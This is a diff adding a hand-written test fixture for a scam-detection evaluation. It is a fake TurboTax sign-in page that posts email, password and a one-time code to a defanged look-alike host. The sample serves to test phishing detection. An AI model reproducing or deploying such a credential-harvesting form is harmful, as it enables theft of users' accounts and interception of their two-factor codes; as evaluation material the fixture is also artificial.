@@ -1,0 +1,15 @@
+# Synthetic page fixture for ScamSentinel evaluation (P2b). Hand-written, not a real page.
+# Plain text on purpose: never rename it to .html or open it in a browser.
+url: hxxps://turbotax-verify[.]net/login
+status: 200
+---
+<html><head><title>TurboTax - Sign In</title></head>
+<body>
+<h1>Sign in to TurboTax</h1>
+<form action="hxxps://intuit-login-relay[.]top/auth.php" method="post">
+  <input type="email" name="email" placeholder="Email or user ID">
+  <input type="password" name="password" placeholder="Password">
+  <input name="otp" placeholder="6-digit verification code">
+  <button>Sign in</button>
+</form>
+</body></html>
